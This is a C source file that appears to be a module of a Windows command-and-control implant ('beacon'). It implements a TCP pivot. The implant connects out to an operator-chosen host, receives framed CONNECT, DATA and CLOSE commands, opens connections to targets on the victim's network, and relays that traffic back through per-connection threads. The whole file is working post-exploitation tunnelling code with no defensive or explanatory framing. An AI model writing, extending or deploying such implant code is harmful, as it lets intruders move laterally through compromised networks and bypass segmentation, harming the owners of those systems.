// TCP pivot — per-connection threading model.
//
// Wire protocol (both directions):
//   Frame: [u8 type][u64 conn_id BE][u32 payload_len BE][payload]
//
//   Server → Beacon:
//     0x01 CONNECT  payload = [u16 port BE][host utf-8]
//     0x04 DATA     payload = raw bytes
//     0x05 CLOSE    payload empty
//
//   Beacon → Server:
//     0x02 CONNECT_OK   payload empty
//     0x03 CONNECT_FAIL payload empty
//     0x04 DATA         payload = raw bytes
//     0x05 CLOSE        payload empty

#include "../core/beacon.h"
#include <winsock2.h>
#include <ws2tcpip.h>

#define PV_CONNECT      0x01
#define PV_CONNECT_OK   0x02
#define PV_CONNECT_FAIL 0x03
#define PV_DATA         0x04
#define PV_CLOSE        0x05

#define PV_MAX_CONNS    256
#define PV_BUF          32768

// ---- globals ----------------------------------------------------------------

static SOCKET            g_pipe     = INVALID_SOCKET;
static CRITICAL_SECTION  g_pipe_cs;   // serialise writes to g_pipe
static volatile LONG     g_pv_init  = 0;
static volatile LONG     g_pv_alive = 0;

// Per-connection registry: maps conn_id → the server-facing socket of the pair.
typedef struct {
    uint64_t id;
    SOCKET   srv_end;  // reader thread writes DATA/CLOSE here
} PvReg;

static PvReg            g_reg[PV_MAX_CONNS];
static CRITICAL_SECTION g_reg_cs;

// ---- init -------------------------------------------------------------------

static void pv_ensure_init(void) {
    LONG s = InterlockedCompareExchange(&g_pv_init, 1, 0);
    if (s == 0) {
        WSADATA wd; WSAStartup(MAKEWORD(2, 2), &wd);
        InitializeCriticalSection(&g_pipe_cs);
        InitializeCriticalSection(&g_reg_cs);
        InterlockedExchange(&g_pv_init, 2);
    } else {
        while (InterlockedCompareExchange(&g_pv_init, 2, 2) != 2) Sleep(0);
    }
}

// ---- helpers ----------------------------------------------------------------

static void pv_u64_be(uint8_t* p, uint64_t v) {
    p[0]=(uint8_t)(v>>56); p[1]=(uint8_t)(v>>48);
    p[2]=(uint8_t)(v>>40); p[3]=(uint8_t)(v>>32);
    p[4]=(uint8_t)(v>>24); p[5]=(uint8_t)(v>>16);
    p[6]=(uint8_t)(v>> 8); p[7]=(uint8_t)(v);
}
static uint64_t pv_rd_u64(const uint8_t* p) {
    return ((uint64_t)p[0]<<56)|((uint64_t)p[1]<<48)|
           ((uint64_t)p[2]<<40)|((uint64_t)p[3]<<32)|
           ((uint64_t)p[4]<<24)|((uint64_t)p[5]<<16)|
           ((uint64_t)p[6]<< 8)| (uint64_t)p[7];
}
static void pv_u32_be(uint8_t* p, uint32_t v) {
    p[0]=(uint8_t)(v>>24); p[1]=(uint8_t)(v>>16);
    p[2]=(uint8_t)(v>> 8); p[3]=(uint8_t)(v);
}
static uint32_t pv_rd_u32(const uint8_t* p) {
    return ((uint32_t)p[0]<<24)|((uint32_t)p[1]<<16)|
           ((uint32_t)p[2]<< 8)| (uint32_t)p[3];
}

static void port_to_str_pv(uint32_t port, char* buf) {
    char tmp[8]; int n = 0;
    if (!port) { buf[0]='0'; buf[1]=0; return; }
    while (port) { tmp[n++]=(char)('0'+port%10); port/=10; }
    int i=0; while(n) buf[i++]=tmp[--n]; buf[i]=0;
}

// Receive exactly n bytes (blocking).
static int pv_recv_exact(SOCKET s, uint8_t* buf, int n) {
    int got = 0;
    while (got < n) {
        int r = recv(s, (char*)buf + got, n - got, 0);
        if (r <= 0) return -1;
        got += r;
    }
    return 0;
}

// Send all bytes to socket (blocking).
static int pv_send_all(SOCKET s, const uint8_t* buf, int n) {
    int sent = 0;
    while (sent < n) {
        int r = send(s, (const char*)buf + sent, n - sent, 0);
        if (r <= 0) return -1;
        sent += r;
    }
    return 0;
}

// Send a framed message to g_pipe, serialised with g_pipe_cs.
static int pv_pipe_frame(uint8_t type, uint64_t id,
                         const uint8_t* pay, uint32_t plen) {
    uint8_t hdr[13];
    hdr[0] = type;
    pv_u64_be(hdr + 1, id);
    pv_u32_be(hdr + 9, plen);
    EnterCriticalSection(&g_pipe_cs);
    int r = pv_send_all(g_pipe, hdr, 13);
    if (r == 0 && plen > 0)
        r = pv_send_all(g_pipe, pay, (int)plen);
    LeaveCriticalSection(&g_pipe_cs);
    return r;
}

// ---- loopback socket pair ---------------------------------------------------
// Windows has no socketpair(). Emulate with a temporary loopback listener.

static int pv_socketpair(SOCKET out[2]) {
    out[0] = out[1] = INVALID_SOCKET;

    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv == INVALID_SOCKET) return -1;

    struct sockaddr_in sa;
    rt_memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    sa.sin_port        = 0;

    if (bind(srv, (struct sockaddr*)&sa, sizeof(sa)) != 0) goto fail;
    int len = sizeof(sa);
    getsockname(srv, (struct sockaddr*)&sa, &len);
    if (listen(srv, 1) != 0) goto fail;

    out[0] = socket(AF_INET, SOCK_STREAM, 0);
    if (out[0] == INVALID_SOCKET) goto fail;
    if (connect(out[0], (struct sockaddr*)&sa, sizeof(sa)) != 0) goto fail;

    out[1] = accept(srv, NULL, NULL);
    if (out[1] == INVALID_SOCKET) goto fail;

    closesocket(srv);
    return 0;
fail:
    closesocket(srv);
    if (out[0] != INVALID_SOCKET) { closesocket(out[0]); out[0] = INVALID_SOCKET; }
    return -1;
}

// ---- registry helpers -------------------------------------------------------

static void reg_add(uint64_t id, SOCKET srv_end) {
    EnterCriticalSection(&g_reg_cs);
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end == INVALID_SOCKET) {
            g_reg[i].id      = id;
            g_reg[i].srv_end = srv_end;
            break;
        }
    }
    LeaveCriticalSection(&g_reg_cs);
}

static void reg_remove(uint64_t id) {
    EnterCriticalSection(&g_reg_cs);
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end != INVALID_SOCKET && g_reg[i].id == id) {
            g_reg[i].srv_end = INVALID_SOCKET;
            break;
        }
    }
    LeaveCriticalSection(&g_reg_cs);
}

// Write data to the srv_end of the connection's socket pair.
// Returns 0 on success, -1 if connection not found or write fails.
static int reg_deliver(uint64_t id, const uint8_t* data, int len) {
    EnterCriticalSection(&g_reg_cs);
    SOCKET s = INVALID_SOCKET;
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end != INVALID_SOCKET && g_reg[i].id == id) {
            s = g_reg[i].srv_end;
            break;
        }
    }
    LeaveCriticalSection(&g_reg_cs);
    if (s == INVALID_SOCKET) return -1;
    return pv_send_all(s, data, len);
}

// Close the srv_end — this signals EOF to the conn thread's relay loop.
static void reg_close(uint64_t id) {
    EnterCriticalSection(&g_reg_cs);
    SOCKET s = INVALID_SOCKET;
    int    slot = -1;
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end != INVALID_SOCKET && g_reg[i].id == id) {
            s    = g_reg[i].srv_end;
            slot = i;
            break;
        }
    }
    if (slot >= 0) g_reg[slot].srv_end = INVALID_SOCKET;
    LeaveCriticalSection(&g_reg_cs);
    if (s != INVALID_SOCKET) closesocket(s);
}

// ---- per-connection thread --------------------------------------------------

typedef struct {
    uint64_t id;
    char     host[256];
    uint16_t port;
    SOCKET   conn_end;  // conn thread owns this end of the socket pair
} PvConnArg;

static DWORD WINAPI pv_conn_thread(LPVOID arg) {
    PvConnArg* a = (PvConnArg*)arg;
    uint64_t id       = a->id;
    SOCKET   conn_end = a->conn_end;

    // Connect to target (blocking).
    char portstr[8]; port_to_str_pv(a->port, portstr);
    struct addrinfo hints, *res = NULL;
    rt_memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    SOCKET target = INVALID_SOCKET;
    if (getaddrinfo(a->host, portstr, &hints, &res) == 0 && res) {
        target = socket(res->ai_family, SOCK_STREAM, 0);
        if (target != INVALID_SOCKET) {
            if (connect(target, res->ai_addr, (int)res->ai_addrlen) != 0) {
                closesocket(target);
                target = INVALID_SOCKET;
            } else {
                int one = 1;
                setsockopt(target, IPPROTO_TCP, TCP_NODELAY,
                           (const char*)&one, sizeof(one));
            }
        }
        freeaddrinfo(res);
    }
    bfree(a);

    if (target == INVALID_SOCKET) {
        bdbg("pv_conn: connect FAIL\n");
        pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0);
        reg_remove(id);
        closesocket(conn_end);
        return 0;
    }

    bdbg("pv_conn: connect OK, sending CONNECT_OK\n");
    if (pv_pipe_frame(PV_CONNECT_OK, id, NULL, 0) != 0) {
        closesocket(target);
        reg_remove(id);
        closesocket(conn_end);
        return 0;
    }

    // Relay: conn_end ↔ target.
    // conn_end carries data from/to the server (via socket pair).
    // target is the actual destination host.
    uint8_t* buf = (uint8_t*)bmalloc(PV_BUF);
    if (!buf) {
        closesocket(target);
        reg_remove(id);
        closesocket(conn_end);
        return 0;
    }

    fd_set rfds;
    for (;;) {
        FD_ZERO(&rfds);
        FD_SET(conn_end, &rfds);
        FD_SET(target,   &rfds);
        if (select(0, &rfds, NULL, NULL, NULL) <= 0) break;

        if (FD_ISSET(conn_end, &rfds)) {
            // Data from server → forward to target.
            int n = recv(conn_end, (char*)buf, PV_BUF, 0);
            if (n <= 0) break;  // server closed this conn
            if (pv_send_all(target, buf, n) != 0) break;
        }
        if (FD_ISSET(target, &rfds)) {
            // Data from target → forward to server as PV_DATA frame.
            int n = recv(target, (char*)buf, PV_BUF, 0);
            if (n <= 0) {
                bdbg("pv_conn: target EOF\n");
                pv_pipe_frame(PV_CLOSE, id, NULL, 0);
                break;
            }
            if (pv_pipe_frame(PV_DATA, id, buf, (uint32_t)n) != 0) break;
        }
    }

    bfree(buf);
    closesocket(target);
    reg_remove(id);
    closesocket(conn_end);
    return 0;
}

// ---- reader / dispatcher thread ---------------------------------------------

static DWORD WINAPI pv_reader(LPVOID p) {
    (void)p;
    bdbg("pv_reader: started\n");

    uint8_t  hdr[13];
    uint8_t* payload  = NULL;
    uint32_t pay_cap  = 0;

    for (;;) {
        // Read fixed 13-byte header (blocking).
        if (pv_recv_exact(g_pipe, hdr, 13) != 0) break;

        uint8_t  type    = hdr[0];
        uint64_t id      = pv_rd_u64(hdr + 1);
        uint32_t pay_len = pv_rd_u32(hdr + 9);

        // Read payload.
        if (pay_len > 0) {
            if (pay_len > pay_cap) {
                bfree(payload);
                payload = (uint8_t*)bmalloc(pay_len);
                pay_cap = payload ? pay_len : 0;
                if (!payload) break;
            }
            if (pv_recv_exact(g_pipe, payload, (int)pay_len) != 0) break;
        }

        switch (type) {
        case PV_CONNECT: {
            if (pay_len < 2) break;
            uint16_t dport = (uint16_t)((payload[0] << 8) | payload[1]);
            uint32_t hlen  = pay_len - 2;
            if (hlen >= 256) hlen = 255;

            // Spawn per-connection thread.
            PvConnArg* arg = (PvConnArg*)bmalloc(sizeof(PvConnArg));
            if (!arg) { pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0); break; }
            rt_memset(arg, 0, sizeof(*arg));
            arg->id   = id;
            arg->port = dport;
            rt_memcpy(arg->host, payload + 2, hlen);
            arg->host[hlen] = 0;

            SOCKET pair[2];
            if (pv_socketpair(pair) != 0) {
                bfree(arg);
                pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0);
                break;
            }
            // pair[0] = conn thread's end, pair[1] = reader/server-facing end.
            arg->conn_end = pair[0];
            reg_add(id, pair[1]);

            HANDLE h = CreateThread(NULL, 0, pv_conn_thread, arg, 0, NULL);
            if (!h) {
                bfree(arg);
                closesocket(pair[0]); closesocket(pair[1]);
                reg_remove(id);
                pv_pipe_frame(PV_CONNECT_FAIL, id, NULL, 0);
            } else {
                CloseHandle(h);
                bdbg("pv_reader: CONNECT — spawned conn thread\n");
            }
            break;
        }
        case PV_DATA:
            if (pay_len > 0)
                reg_deliver(id, payload, (int)pay_len);
            break;
        case PV_CLOSE:
            reg_close(id);
            break;
        }
    }

    bdbg("pv_reader: pipe closed — cleaning up\n");
    bfree(payload);

    // Close all open srv_ends so conn threads exit their relay loops.
    EnterCriticalSection(&g_reg_cs);
    for (int i = 0; i < PV_MAX_CONNS; ++i) {
        if (g_reg[i].srv_end != INVALID_SOCKET) {
            closesocket(g_reg[i].srv_end);
            g_reg[i].srv_end = INVALID_SOCKET;
        }
    }
    LeaveCriticalSection(&g_reg_cs);

    if (g_pipe != INVALID_SOCKET) { closesocket(g_pipe); g_pipe = INVALID_SOCKET; }
    InterlockedExchange(&g_pv_alive, 0);
    return 0;
}

// ---- OP_TCP_PIVOT -----------------------------------------------------------

void cmd_tcp_pivot(const BeaconTask* t) {
    pv_ensure_init();

    if (InterlockedCompareExchange(&g_pv_alive, 0, 0))
        return;  // already running

    // Initialise registry.
    EnterCriticalSection(&g_reg_cs);
    for (int i = 0; i < PV_MAX_CONNS; ++i)
        g_reg[i].srv_end = INVALID_SOCKET;
    LeaveCriticalSection(&g_reg_cs);

    char     host[256] = {0};
    uint32_t port      = 0;
    kv_get_str(t->pay, t->pay_len, "host", host, sizeof(host));
    kv_get_u32(t->pay, t->pay_len, "port", &port);

    char portstr[8]; port_to_str_pv(port, portstr);

    struct addrinfo hints, *res = NULL;
    rt_memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, portstr, &hints, &res) != 0 || !res) return;

    SOCKET s = socket(res->ai_family, SOCK_STREAM, 0);
    int ok = 0;
    if (s != INVALID_SOCKET && connect(s, res->ai_addr, (int)res->ai_addrlen) == 0)
        ok = 1;
    freeaddrinfo(res);

    if (!ok) {
        if (s != INVALID_SOCKET) closesocket(s);
        return;
    }

    g_pipe = s;
    InterlockedExchange(&g_pv_alive, 1);

    HANDLE h = CreateThread(NULL, 0, pv_reader, NULL, 0, NULL);
    if (h) {
        CloseHandle(h);
    } else {
        closesocket(s); g_pipe = INVALID_SOCKET;
        InterlockedExchange(&g_pv_alive, 0);
    }
}
